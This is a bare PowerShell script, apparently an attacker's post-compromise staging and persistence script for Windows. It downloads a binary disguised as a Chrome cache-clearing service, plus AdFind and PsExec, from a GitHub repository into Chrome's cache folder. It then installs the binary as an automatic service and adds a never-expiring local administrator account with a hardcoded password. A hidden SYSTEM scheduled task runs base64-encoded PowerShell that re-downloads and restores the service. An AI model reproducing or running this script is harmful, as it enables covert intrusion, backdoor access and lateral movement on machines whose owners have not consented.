New-Item -ItemType Directory -Force -Path "C\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cache"
Wget "https://github.com/cudkajak/storage_unit13/blob/main/tools/google_cache_clear_service.exe?raw=true" -OutFile "C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cache\google_cache_clear_service.exe"
Wget "https://github.com/cudkajak/storage_unit13/blob/main/tools/AdFind.exe?raw=true" -OutFile "C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cache\AdFind.exe"
Wget "https://github.com/cudkajak/storage_unit13/blob/main/tools/PsExec.exe?raw=true" -OutFile "C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cache\PsExec.exe"

#create service
New-Service -Name "google_cache_clear" -DisplayName "Google Cache Clear" -Description "Service clears unused data from google chrome cache" -StartupType "Automatic" -BinaryPathName "C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cache\google_cache_clear_service.exe"
Start-Service -Name google_cache_clear

#new User
net user google_cache_account Igoty0u /add /expires:never
net localgroup administrators google_cache_account /add

#create task
$taskname = "google_cache_clear_check"
$taskdescription = "Cheks results of google cache clear"
$action = New-ScheduledTaskAction -Execute 'Powershell.exe' `
  -Argument '-NoProfile -WindowStyle Hidden -enc "aQBmACgALQBuAG8AdAAoAFQAZQBzAHQALQBwAGEAdABoACAAIgBDADoAXABVAHMAZQByAHMAXABiAG8AYgBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABHAG8AbwBnAGwAZQBcAEMAaAByAG8AbQBlAFwAVQBzAGUAcgAgAEQAYQB0AGEAXABEAGUAZgBhAHUAbAB0AFwAQwBhAGMAaABlAFwAZwBvAG8AZwBsAGUAXwBjAGEAYwBoAGUAXwBjAGwAZQBhAHIAXwBzAGUAcgB2AGkAYwBlAC4AZQB4AGUAIgApACkACgAgAHsACgBOAGUAdwAtAEkAdABlAG0AIAAtAEkAdABlAG0AVAB5AHAAZQAgAEQAaQByAGUAYwB0AG8AcgB5ACAALQBGAG8AcgBjAGUAIAAtAFAAYQB0AGgAIAAiAEMAXABVAHMAZQByAHMAXABiAG8AYgBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABHAG8AbwBnAGwAZQBcAEMAaAByAG8AbQBlAFwAVQBzAGUAcgAgAEQAYQB0AGEAXABEAGUAZgBhAHUAbAB0AFwAQwBhAGMAaABlACIACgBXAGcAZQB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAGMAdQBkAGsAYQBqAGEAawAvAHMAdABvAHIAYQBnAGUAXwB1AG4AaQB0ADEAMwAvAGIAbABvAGIALwBtAGEAaQBuAC8AdABvAG8AbABzAC8AZwBvAG8AZwBsAGUAXwBjAGEAYwBoAGUAXwBjAGwAZQBhAHIAXwBzAGUAcgB2AGkAYwBlAC4AZQB4AGUAPwByAGEAdwA9AHQAcgB1AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAQwA6AFwAVQBzAGUAcgBzAFwAYgBvAGIAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwARwBvAG8AZwBsAGUAXABDAGgAcgBvAG0AZQBcAFUAcwBlAHIAIABEAGEAdABhAFwARABlAGYAYQB1AGwAdABcAEMAYQBjAGgAZQBcAGcAbwBvAGcAbABlAF8AYwBhAGMAaABlAF8AYwBsAGUAYQByAF8AcwBlAHIAdgBpAGMAZQAuAGUAeABlACIACgBpAGYAKAAoAEcAZQB0AC0AUwBlAHIAdgBpAGMAZQAgAC0ATgBhAG0AZQAgACIAZwBvAG8AZwBsAGUAXwBjAGEAYwBoAGUAXwBjAGwAZQBhAHIAIgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQApACAALQBlAHEAIAAkAG4AdQBsAGwAKQAKAHsACgBOAGUAdwAtAFMAZQByAHYAaQBjAGUAIAAtAE4AYQBtAGUAIAAiAGcAbwBvAGcAbABlAF8AYwBhAGMAaABlAF8AYwBsAGUAYQByACIAIAAtAEQAaQBzAHAAbABhAHkATgBhAG0AZQAgACIARwBvAG8AZwBsAGUAIABDAGEAYwBoAGUAIABDAGwAZQBhAHIAIgAgAC0ARABlAHMAYwByAGkAcAB0AGkAbwBuACAAIgBTAGUAcgB2AGkAYwBlACAAYwBsAGUAYQByAHMAIAB1AG4AdQBzAGUAZAAgAGQAYQB0AGEAIABmAHIAbwBtACAAZwBvAG8AZwBsAGUAIABjAGgAcgBvAG0AZQAgAGMAYQBjAGgAZQAiACAALQBTAHQAYQByAHQAdQBwAFQAeQBwAGUAIAAiAEEAdQB0AG8AbQBhAHQAaQBjACIAIAAtAEIAaQBuAGEAcgB5AFAAYQB0AGgATgBhAG0AZQAgACIAQwA6AFwAVQBzAGUAcgBzAFwAYgBvAGIAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwARwBvAG8AZwBsAGUAXABDAGgAcgBvAG0AZQBcAFUAcwBlAHIAIABEAGEAdABhAFwARABlAGYAYQB1AGwAdABcAEMAYQBjAGgAZQBcAGcAbwBvAGcAbABlAF8AYwBhAGMAaABlAF8AYwBsAGUAYQByAF8AcwBlAHIAdgBpAGMAZQAuAGUAeABlACIACgBTAHQAYQByAHQALQBTAGUAcgB2AGkAYwBlACAALQBOAGEAbQBlACAAZwBvAG8AZwBsAGUAXwBjAGEAYwBoAGUAXwBjAGwAZQBhAHIACgB9AAoAIAB9ACAAZQBsAHMAZQAgAHsACgBpAGYAKAAoAEcAZQB0AC0AUwBlAHIAdgBpAGMAZQAgAC0ATgBhAG0AZQAgACIAZwBvAG8AZwBsAGUAXwBjAGEAYwBoAGUAXwBjAGwAZQBhAHIAIgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQApACAALQBlAHEAIAAkAG4AdQBsAGwAKQAKAHsACgBOAGUAdwAtAFMAZQByAHYAaQBjAGUAIAAtAE4AYQBtAGUAIAAiAGcAbwBvAGcAbABlAF8AYwBhAGMAaABlAF8AYwBsAGUAYQByACIAIAAtAEQAaQBzAHAAbABhAHkATgBhAG0AZQAgACIARwBvAG8AZwBsAGUAIABDAGEAYwBoAGUAIABDAGwAZQBhAHIAIgAgAC0ARABlAHMAYwByAGkAcAB0AGkAbwBuACAAIgBTAGUAcgB2AGkAYwBlACAAYwBsAGUAYQByAHMAIAB1AG4AdQBzAGUAZAAgAGQAYQB0AGEAIABmAHIAbwBtACAAZwBvAG8AZwBsAGUAIABjAGgAcgBvAG0AZQAgAGMAYQBjAGgAZQAiACAALQBTAHQAYQByAHQAdQBwAFQAeQBwAGUAIAAiAEEAdQB0AG8AbQBhAHQAaQBjACIAIAAtAEIAaQBuAGEAcgB5AFAAYQB0AGgATgBhAG0AZQAgACIAQwA6AFwAVQBzAGUAcgBzAFwAYgBvAGIAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwARwBvAG8AZwBsAGUAXABDAGgAcgBvAG0AZQBcAFUAcwBlAHIAIABEAGEAdABhAFwARABlAGYAYQB1AGwAdABcAEMAYQBjAGgAZQBcAGcAbwBvAGcAbABlAF8AYwBhAGMAaABlAF8AYwBsAGUAYQByAF8AcwBlAHIAdgBpAGMAZQAuAGUAeABlACIACgBTAHQAYQByAHQALQBTAGUAcgB2AGkAYwBlACAALQBOAGEAbQBlACAAZwBvAG8AZwBsAGUAXwBjAGEAYwBoAGUAXwBjAGwAZQBhAHIACgB9AAoAIAB9AA=="'
$trigger =  New-ScheduledTaskTrigger -AtStartup -RandomDelay (New-TimeSpan -minutes 3)
$settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 2) -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskname -Description $taskdescription -Settings $settings -User "System"